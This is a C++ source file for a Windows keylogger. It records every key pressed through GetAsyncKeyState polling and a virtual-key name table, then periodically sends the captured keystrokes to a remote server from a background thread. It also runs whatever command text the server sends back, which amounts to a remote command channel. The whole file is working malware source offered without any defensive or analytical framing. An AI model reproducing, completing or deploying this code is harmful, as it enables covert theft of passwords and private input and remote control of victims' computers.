#include "stdafx.h"
#include "Keylogger.h"

#include "Settings.h"
#include "Network.h"
#include "Util.h"

Keylogger keylogger;

const wchar_t* X = ((const wchar_t*)~0);

// http://msdn.microsoft.com/en-us/library/windows/desktop/dd375731%28v=vs.85%29.aspx
const wchar_t* keyStrings[] =
{
/* 0 */ 0, 0, 0, 0, 0, 0, 0, 0, L"[Back]", L"[Tab]", 0, 0, L"[Clear]", L"[Enter]", 0, 0,
/* 1 */ L"[Shift]", L"[Ctrl]", L"[Alt]", L"[Pause]", L"[CAPS]", 0, 0, 0, 0, 0, 0, L"[Esc]", 0, 0, 0, 0,
/* 2 */ L" ", L"[PgUp]", L"[PgDown]", L"[End]", L"[Home]", L"[<]", L"[^]", L"[>]", L"[v]", L"[Select]", L"[Print]", L"[Execute]", L"[PrintScreen]", L"[Ins]", L"[Del]", L"[Help]",
/* 3 */ X, X, X, X, X, X, X, X, X, X, 0, 0, 0, 0, 0, 0,
/* 4 */ 0, X, X, X, X, X, X, X, X, X, X, X, X, X, X, X,
/* 5 */ X, X, X, X, X, X, X, X, X, X, X, L"[LWin]", L"[RWin]", L"[Apps]", 0, L"[Sleep]",
/* 6 */ X, X, X, X, X, X, X, X, X, X, L"*", L"+", 0, L"-", L".", L"/",
/* 7 */ L"[F1]", L"[F2]", L"[F3]", L"[F4]", L"[F5]", L"[F6]", L"[F7]", L"[F8]", L"[F9]", L"[F10]", L"[F11]", L"[F12]", L"[F13]", L"[F14]", L"[F15]", L"[F16]",
/* 8 */ L"[F17]", L"[F18]", L"[F19]", L"[F20]", L"[F21]", L"[F22]", L"[F23]", L"[F24]", 0, 0, 0, 0, 0, 0, 0, 0,
/* 9 */ L"[NumLock]", L"[ScrollLock]", X, X, X, X, X, 0, 0, 0, 0, 0, 0, 0, 0, 0,
/* A */ 0, 0, 0, 0, 0, 0, L"[BBack]", L"[BForward]", L"[BRefresh]", L"[BStop]", L"[BSearch]", L"[BFavorites]", L"[BHome]", L"[VolMute]", L"[VolDown]", L"[VolUp]",
/* B */ L"[MNext]", L"[MPrev]", L"[MStop]", L"[MPlayPause]", L"[LaunchMail]", L"LaunchSelect", L"[LaunchApp1]", L"[LaunchApp2]", 0, 0, X, X, X, X, X, X,
/* C */ X, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, X, X, X, X, X,
/* D */ 0, X, X, X, X, 0, X, 0, 0, X, X, X, X, X, X, X,
/* E */ X, X, X, X, X, X, 0, 0, 0, X, X, X, X, X, X, X,
/* F */ X, X, X, X, X, X, L"[Attn]", L"[CrSel]", L"[ExSel]", L"[EraseEOF]", L"[Play]", L"[Zoom]", 0, L"[PA1]", L"[Clear]", 0,
/*      0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F */
};

Keylogger::Keylogger() : shouldStop(false), sendInterval(V_SEND_INTERVAL_MIN)
{
	memset(keysActive, 0, sizeof(keysActive));
	memset(keyBuf, 0, sizeof(keyBuf));
}
Keylogger::~Keylogger()
{

}

void Keylogger::Run()
{
	DWORD ticksLast = GetTickCount();

	keysPressed.assign(L"d=");

	for (;;)
	{
		Sleep(V_IDLE_TIME);

		if (GetTickCount() - ticksLast >= this->sendInterval)
		{
			this->SendNewThread(keysPressed);
			keysPressed.assign(L"d=");

			if (this->shouldStop)
				break;

			ticksLast = GetTickCount();
		}

		for(int i = 0; i <= 256; i++)
		{
			this->CheckKey(i);
		}
	}
}
void Keylogger::Stop()
{
	this->shouldStop = true;
}

void Keylogger::CheckKey(short i)
{
	SHORT state = GetAsyncKeyState(i);
	BOOL keyPrev = keysActive[i];
	keysActive[i] = (state >> 8);

	if (!keyPrev && keysActive[i])
	{
		const wchar_t* str = keyStrings[i];
		
		if (str == X)
		{
			int ret = ToUnicode(i, 0, this->keysActive, keyBuf, sizeof(keyBuf), 0);
			if (ret > 0) {
				keysPressed.append(keyBuf);
			}
		}
		else if (str)
		{
			keysPressed.append(str);
		}
	}
}


typedef struct {
	Keylogger *keylogger;
	std::wstring keys;
} ProcSend_Data;
DWORD WINAPI ProcSend(LPVOID lpParameter)
{
	ProcSend_Data *data = (ProcSend_Data*) lpParameter;
	data->keylogger->Send(data->keys);
	delete data;
	return 0;
}

void Keylogger::SendNewThread(const std::wstring& keys)
{
	ProcSend_Data *data = new ProcSend_Data{ this, std::wstring(keys) };

	CreateThread(0, 0xFFFF, ProcSend, data, 0, 0);
}
void Keylogger::Send(const std::wstring& keys)
{
	size_t resp_len;
	wchar_t *resp;
	bool ret = network.SendAndGetTextW(V_NET_FILE_DATA, keys.c_str(), &resp_len, &resp);

	if (ret && resp_len > 0)
	{
		this->IncreaseSendInterval();

		cmd.Run(std::wstring(resp, resp_len));
	}
	else
	{
		this->DecreaseSendInterval();
	}

	if (ret) free(resp);
}

void Keylogger::IncreaseSendInterval()
{
	//this->sendInterval = max(V_SEND_INTERVAL_MIN, this->sendInterval / 3);
	this->sendInterval = V_SEND_INTERVAL_MIN;
}
void Keylogger::DecreaseSendInterval()
{
	this->sendInterval = min(V_SEND_INTERVAL_MAX, this->sendInterval * 20 / 19);
}